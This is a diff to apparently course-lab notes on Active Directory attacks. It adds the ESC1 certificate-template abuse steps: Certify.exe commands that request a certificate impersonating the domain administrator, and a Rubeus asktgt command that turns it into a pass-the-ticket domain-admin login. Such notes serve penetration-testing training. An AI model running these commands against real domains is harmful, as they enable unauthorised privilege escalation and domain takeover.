@@ -41,11 +41,19 @@ __Enumerate vulnerable templates__
 Certify.exe find /vulnerable
 ```
 
-__Enumerate Enrollee can supply subject__
+#### ESC1
+- The template "HTTPSCertificates" has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag
 ```powershell
 Certify.exe /enrolleeSuppliesSubject
 ```
-#### ESC1
+- The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx
+```powershell
+Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
+```
+- Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA).
+```powershell
+Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
+```
 
 
 
